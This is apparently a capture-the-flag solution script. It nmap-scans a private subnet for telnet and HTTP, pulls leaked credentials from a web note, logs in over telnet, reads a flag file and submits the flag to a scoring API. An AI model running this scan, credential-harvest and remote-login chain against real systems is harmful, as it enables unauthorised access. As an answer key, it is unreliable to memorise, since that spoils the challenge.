#!/bin/sh
set -eu

host=$(nmap -n -p 23,80 --open -oG - 172.20.0.141-199 | awk '/Ports:/{if ($0 ~ /23\/open/ && $0 ~ /80\/open/) {print $2; exit}}')
if [ -z "$host" ]; then
  echo "Could not find the paste relay services." >&2
  exit 1
fi

roster=$(curl -fsS "http://$host/relay-note.txt")
user=$(printf '%s\n' "$roster" | sed -n 's/^user=//p')
password=$(printf '%s\n' "$roster" | sed -n 's/^password=//p')
if [ -z "$user" ] || [ -z "$password" ]; then
  echo "The public relay note did not contain account details." >&2
  exit 1
fi

export RELAY_HOST="$host" RELAY_USER="$user" RELAY_PASSWORD="$password"
flag=$(python3 - <<'PY'
import os
import re
import socket

sock = socket.create_connection((os.environ["RELAY_HOST"], 23), timeout=8)
sock.settimeout(8)

def until(marker):
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise RuntimeError("The terminal closed the connection unexpectedly")
        data.extend(chunk)
    return bytes(data)

until(b"login: ")
sock.sendall(os.environ["RELAY_USER"].encode() + b"\r\n")
until(b"Password: ")
sock.sendall(os.environ["RELAY_PASSWORD"].encode() + b"\r\n")
until(b"$ ")
sock.sendall(b"cat /home/relay/crew-record.txt\r\n")
response = until(b"$ ")
sock.close()
match = re.search(rb"BSY\{[^}\r\n]+\}", response)
if not match:
    raise SystemExit("Authenticated, but the crew record did not return a flag.")
print(match.group(0).decode())
PY
)
if [ -z "$flag" ]; then
  echo "No flag was recovered." >&2
  exit 1
fi
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"scl-challenge-frame-02899e\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
printf '\n'
